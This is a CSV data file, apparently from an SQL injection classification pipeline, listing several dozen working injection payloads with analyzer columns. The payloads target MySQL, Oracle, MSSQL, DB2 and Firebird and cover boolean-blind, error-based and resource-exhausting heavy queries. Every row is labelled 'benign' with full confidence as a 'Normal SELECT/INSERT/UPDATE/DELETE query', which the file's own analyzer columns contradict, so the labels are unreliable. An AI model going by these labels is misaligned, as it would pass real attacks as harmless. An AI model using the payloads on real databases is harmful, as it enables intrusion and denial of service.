payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-7528' or make_set ( 3809 = 1821,1821 ) and 'kgch' = 'kgch",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2130,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-7528' or make_set ( 3809 = 1821,1821 ) and 'kgch' = 'kgch"
"1"" ) as tecq where 4817 = 4817 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2131,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1"" ) as tecq where 4817 = 4817 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --"
"1 ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 7984 = 7984",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2132,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 7984 = 7984"
"-9810' ) where 4361 = 4361 or elt ( 1032 = 1032,3623 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2133,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-9810' ) where 4361 = 4361 or elt ( 1032 = 1032,3623 ) --"
"1"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""xqlh"" = ""xqlh",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2134,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"1"" ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""xqlh"" = ""xqlh"
"1"" where 9341 = 9341",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2135,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 9341 = 9341"
1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- izad,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2136,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- izad
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ||'",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2137,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ||'"
"-4453' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'boxt' = 'boxt",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2138,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-4453' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'boxt' = 'boxt"
"-4233%"" ) or ( 8459 = 8459 ) *4906 and ( ""%"" = """,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2139,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-4233%"" ) or ( 8459 = 8459 ) *4906 and ( ""%"" = """
-8224' ) where 6504 = 6504 or 2461 = 5660,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2140,boolean_blind,generic,Pattern match: 'or 2461 = 5660' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8224' ) where 6504 = 6504 or 2461 = 5660
-3125' ) ) ) order by 1#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2141,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-3125' ) ) ) order by 1#
"1 ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2142,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )"
-9087 or 3038 = 3038,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2143,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-9087 or 3038 = 3038
"1 ) as tgqd where 6369 = 6369 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2144,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1 ) as tgqd where 6369 = 6369 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"
end and 'huti' like 'huti,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2145,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,end and 'huti' like 'huti
-7346 or 8571 = 8571--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2146,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7346 or 8571 = 8571--
-8015 ) where 9808 = 9808 or 9323 = 9323#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2147,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8015 ) where 9808 = 9808 or 9323 = 9323#
"1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'gucd' = 'gucd",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2148,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'gucd' = 'gucd"
select ( case when ( 8978 = 1426 ) then 1 else 8978* ( select 8978 from master..sysdatabases ) end ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2149,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 8978 = 1426 ) then 1 else 8978* ( select 8978 from master..sysdatabases ) end ) --
"1"" ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2150,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
-1192 order by 1#,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2151,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-1192 order by 1#
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ""ihqf"" = ""ihqf",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2152,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ""ihqf"" = ""ihqf"
"1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'sdnc' = 'sdnc",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2153,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'sdnc' = 'sdnc"
1 ) where 4573 = 4573,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2154,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 4573 = 4573
-8074' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'lnwm' = 'lnwm,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2155,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,-8074' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'lnwm' = 'lnwm
"1"" where 2204 = 2204 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2156,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 2204 = 2204 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
1' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2157,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --
"1"" where 9083 = 9083 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2158,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" where 9083 = 9083 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --"
"-7831"" ) ) as krzi where 3798 = 3798 order by 1--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2159,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"-7831"" ) ) as krzi where 3798 = 3798 order by 1--"
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""pmpk"" like ""pmpk",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2160,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""pmpk"" like ""pmpk"
"1"" ) where 4660 = 4660 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2161,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) where 4660 = 4660 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"1 where 6077 = 6077 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2162,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 where 6077 = 6077 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --"
"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2163,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )"
"1, ( case when 8260 = 8260 then 1 else null end )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2164,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1, ( case when 8260 = 8260 then 1 else null end )"
"1"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""tzog"" like ""tzog",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2165,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""tzog"" like ""tzog"
"-5996 ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2166,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-5996 ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )"
1'|| ( select 'mlwj' from dual where 4247 = 4247 and 1702 = 8469 ) ||',benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2167,boolean_blind,oracle,Pattern match: 'and 1702 = 8469' → boolean_blind (P3); DB signature: oracle,boolean_blind,oracle,"boolean condition (1=1, RLIKE, or ELT)",1'|| ( select 'mlwj' from dual where 4247 = 4247 and 1702 = 8469 ) ||'
"-4054"" or 2824 = 4788--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2168,boolean_blind,generic,Pattern match: 'or 2824 = 4788' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-4054"" or 2824 = 4788--"
"( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2169,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )"
"1"" ) ) as vigs where 6175 = 6175 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2170,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) as vigs where 6175 = 6175 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --"
1'+ ( select 'dpun' where 4760 = 4760,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2171,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'dpun' where 4760 = 4760
-9555' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'rwpq' like 'rwpq,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2172,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-9555' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'rwpq' like 'rwpq
"1"" ) as pydh where 3407 = 3407 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2173,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as pydh where 3407 = 3407 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
1 ) ) as goar where 2405 = 2405 and 5927 = 9731--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2174,boolean_blind,generic,Pattern match: 'and 5927 = 9731' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) as goar where 2405 = 2405 and 5927 = 9731--
"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2175,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1'+ ( select ounb where 4653 = 4653 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) ) +'"
"-9772' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'igaa' = 'igaa",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2176,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-9772' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'igaa' = 'igaa"
1 ) where 7729 = 7729,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2177,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 7729 = 7729
"1 ) ) as zdbj where 2300 = 2300 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2178,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) ) as zdbj where 2300 = 2300 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --"
"1"" ) ) as ogzn where 6849 = 6849 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2179,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as ogzn where 6849 = 6849 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
-5580 or 4829 = 1968,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2180,boolean_blind,generic,Pattern match: 'or 4829 = 1968' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5580 or 4829 = 1968
1 ) as qkkm where 8461 = 8461,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2181,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as qkkm where 8461 = 8461
"1"" ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""vypw"" like ""vypw",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2182,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1"" ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""vypw"" like ""vypw"
1'|| ( select 'dajl' from dual where 8440 = 8440,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2183,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'dajl' from dual where 8440 = 8440
